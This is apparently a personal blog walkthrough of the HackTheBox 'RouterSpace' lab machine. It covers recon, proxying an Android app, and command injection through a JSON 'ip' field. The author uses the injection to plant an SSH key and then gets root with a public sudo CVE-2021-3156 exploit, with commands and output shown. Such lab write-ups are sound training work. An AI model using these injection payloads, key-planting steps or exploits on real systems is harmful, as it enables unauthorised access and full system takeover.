---
title: HackTheBox - RouterSpace
date: 2022-08-17 20:00:00 +/- 0000
categories: [HackTheBox,Easy]
author: Connor
tags: [routerspace,android]
image: /assets/img/Icons/RouterSpace/routerspace.png
---

# RouterSpace
---
Initial configuration for this machine was very annoying, but once i got anbox working correctly it was rather straight forward. 
---
## Recon
<pre>
──(root💀Kali)-[~]
└─# nmap 10.10.11.148 -Pn -sV -sC
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 16:19 GMT
Nmap scan report for routerspace.htb (10.10.11.148)
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-46773
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 70
|     ETag: W/"46-mfBDzdyJQiAB5GVUFd3LcNfMcC0"
|     Date: Mon, 07 Mar 2022 16:20:22 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: qD Vc jdX7z c 6d1 }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-36383
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Mon, 07 Mar 2022 16:20:21 GMT
|     Connection: close
|
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-19862
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Mon, 07 Mar 2022 16:20:21 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: RouterSpace

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.07 seconds</pre>

From nmap, we can see SSH on Port 22, and a HTTP server on port 80. Browsing to the website, we are met with the following landing page:

![HomePage](/assets/img/Icons/RouterSpace/routerspacewebpage.png)

The site displays information on an application called RouterSpace,  that can connect routers to routerspace. The site allows us to download `routerspace.apk`, an android application.

## Installing the APK
Originally, i tried to do this using `genymotion`, however i was unsuccessful in capturing any requests from the application in burp. Due to this, i changed to `anbox`, and had much more success.

### Installing Anbox
I used the following guide to install anbox on my Kali VM:

https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd

I also downloaded the recommended anbox android image from:

https://build.anbox.io/android-images/2018/07/19/

Once anbox was installed, i installed the `routerspace.apk` package into anbox using:

`adb install routerspace.apk`

I then launched anbox, ran routerspace and was presented with an application screen with a "Check Status" button:

![app](/assets/img/Icons/RouterSpace/routerspaceapp.png)

So i decided to try and capture the request with burp.

### Burp
After launching burp, i went to Proxy Options > Proxy Listeners. I added a listener on port 8000, using my tun0 IP address `10.10.14.49`.

![burp](/assets/img/Icons/RouterSpace/burp-listener.png)

Now i needed to add the burp proxy to anbox, and i did this using 

`adb shell settings put global http_proxy 10.10.14.49:8000`

Now when clicking "Check Status", burp caught the POST request and returned the following:

![burp2](/assets/img/Icons/RouterSpace/burp-POST.png)

I then sent this request to repeater, and played around with the request. By editing the JSON ip field, and inputting a `;`, i was able to input a command and the remote target would execute it. For this POST request, i used `"IP":";whoami"`, and in the responce received `"\npaul\n"`. 
![burp3](/assets/img/Icons/RouterSpace/burp-lspaul.png)

Knowing that the user is Paul, lets have a look inside his directory:

![burp4](/assets/img/Icons/RouterSpace/burp-whoami.png)

We can see a user.txt, but when trying to cat it, the resulting hash is the incorrect flag.
## Exploiting RouterSpace
From here, i tried executing different commands to attempt to launch a reverse shell, but i was unable too. This got me thinking about a potential SSH foothold, due to port 22 being open. Lets see if Paul has a .ssh directory
`"ip":";ls -la /home/paul/.ssh"`

![burp5](/assets/img/Icons/RouterSpace/burp-sshresponce.png)

There is a .ssh directory, but there is no public `id_rsa` key within it, which means i can potentially add my own, and then SSH into the target host.

### SSH Key Generation
To generate the keys needed, i ran `ssh-keygen` within the `.ssh` directory.
<pre>
┌──(root💀Kali)-[~/.ssh]
└─# ssh-keygen                                                                             
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:yEFblsfeIJdPKDEX6Xo1saLB0SZuwo60ARI3wetYseU root@NTAKali
The key's randomart image is:
+---[RSA 3072]----+
|.o+.  . ==o=     |
|..+... +*o@ o    |
| . B .oo @ = o   |
|  + E.oo= + *    |
| + . =ooS+ o .   |
|. . o . o .      |
|         .       |
|                 |
|                 |
+----[SHA256]-----+
</pre>

And now below we can see our key.

<pre>
┌──(root💀NTAKali)-[~/.ssh]
└─# ls                                                                                     
id_rsa  id_rsa.pub

┌──(root💀NTAKali)-[~/.ssh]
└─# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkJAfyFYWN+xxa7v9qNUnVn4ZXLS7HMrfLQ3z8ioTH19CSa/CeSLo2oFQcXQ4CJ3UFvETOVHKl03CLF5aIGBMZxjVHdTr66ZtrKSMVuwP7D/JuyV+m9n/kL/wKS/o+c7AgwjNCLH0MDdbPA83UwSSIGDw4jtxEMf0hIzQ+Vqn9bg8F8DX49yXEVml1biEdEOAgEEJw/Wi6nvkRzcZOxijqNfyDjCWdJP0+AlVwfpp73M/9txs1B2SminwOd7YA+Wpc27cV6/O4vSQr/FgiIi3p9h2NYbnGwyRIvOiUM+gz1nQb5VXs2PKvY8t3wRvPpquzZXis/QgLo3d8TyvDQ/xkStezvdN1YRqLQTnwXJI/mQSfHuF2jwE6mksyEqJjv9aSzKlwblqCCTO3Jl3EtO4/cZz4aaYmhYuJ60RmsHm6wuPzRzG+Fe5NPWKEZVS+HrV+xHlc0gvZ9qLx57cLIPV0jwXkys+Q22jashzB3LfwrDMGp/bMaCCj25nUzS3KP8E= root@NTAKali
</pre>

### Adding key to target host
Using burp, i can echo the key into the `.ssh` directory, in a file called `authoried_keys` using:

`{"ip":";echo '<Generated Key>' >> /home/paul/.ssh/authorized_keys"}`

![burp](/assets/img/Icons/RouterSpace/burp-adding-sshkey.png)

As we can see from the image below, the file was created. However, as a Brit, i spelt the directory wrong and used an `s` instead of a `z` - Oops.

![burp](/assets/img/Icons/RouterSpace/burp-wrong-s.png)

From here, i re-uploaded the key to the correct directory, and attempted to connect via SSH.

<pre>
┌──(root💀NTAKali)-[~]
└─# ssh paul@10.10.11.148                                                             
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Mar 2022 12:22:28 AM UTC

  System load:           0.0
  Usage of /:            70.5% of 3.49GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             214
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.148
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f84a


80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
paul@routerspace:~$ whoami
paul
paul@routerspace:~$    
</pre>

### User
Once SSH'd in, it's as simple as reading the user.txt file.
<pre>
paul@routerspace:~$ cat user.txt
*a*6e7db55**55b726a36f***04f7d6*
</pre>

## Priveledge Esculation
Once i had gained a foothold, i attempted to download `linpeas.sh` on the target host. However after setting up the python server, the target host was unable to connect to it to download the file.

<pre>paul@routerspace:~$ wget http://10.10.14.49:4444/linpeas.sh
--2022-03-08 00:34:13--  http://10.10.14.49:4444/linpeas.sh
Connecting to 10.10.14.49:4444... ^C
paul@routerspace:~$
</pre>

Instead, i can use Secure Copy `scp` to upload the file from my local host to the target host over port 22.

`scp -P 22 ../Desktop/linpeas.sh paul@10.10.11.148:/home/paul`

![linpeas](/assets/img/Icons/RouterSpace/linpeas-proof.png)

Initially, i attempted to use PwnKit on the machine, as linpeas recommended it.


<pre>╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                
[+] [CVE-2021-4034] PwnKit                                                                        

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
</pre>


After looking through linpeas again, i noticed that the host is running a vulnerable version of sudo `1.8.31`, but for some reason linpeas didn't report the CVE issue. 
![sudo](/assets/img/Icons/RouterSpace/sudo-version.png)
One way to test whether sudo is vulnerable to CVE-2021-3156 or not is to run `sudoedit -s /`, if sudo asks for the users password, it is likely vulnerable.

After googling exploits related to the CVE, i decided to use the following exploit:
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit

After downloading the file to my host machine and unzipping it, i transffered the files over via scp like before. After, i ran `make` which created an `exploit` executable. Running this executable elevated me to root!


<pre>
paul@routerspace:~/test$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
paul@routerspace:~/test$ ls
exploit  exploit.c  libnss_x  Makefile  shellcode.c
paul@routerspace:~/test$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
</pre>

### Root
Moving to the root directory, we find the root text file.
<pre>
# ls
root.txt
# cat root.txt  
***71152fb82d**f7114dfcd*6dac***
</pre>
